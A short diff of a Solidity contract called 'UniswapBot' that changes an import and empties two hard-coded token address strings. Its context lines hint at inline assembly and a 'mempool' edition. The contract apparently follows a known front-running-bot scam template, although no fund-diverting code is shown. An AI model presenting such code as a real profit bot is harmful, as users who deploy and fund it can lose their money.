@@ -1,9 +1,8 @@
-Copy
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
-import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
+import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
 
@@ -53,8 +52,8 @@ contract UniswapBot {
 			uint a;
 			uint b;
 
-            string memory  WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
-            string memory  TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory  WETH_CONTRACT_ADDRESS = "";
+            string memory  TOKEN_CONTRACT_ADDRESS = "";
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
             loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
 			assembly {
@@ -265,4 +264,3 @@ contract UniswapBot {
 		return string(abi.encodePacked(_mempoolEdition));
 	}
 }
-	 
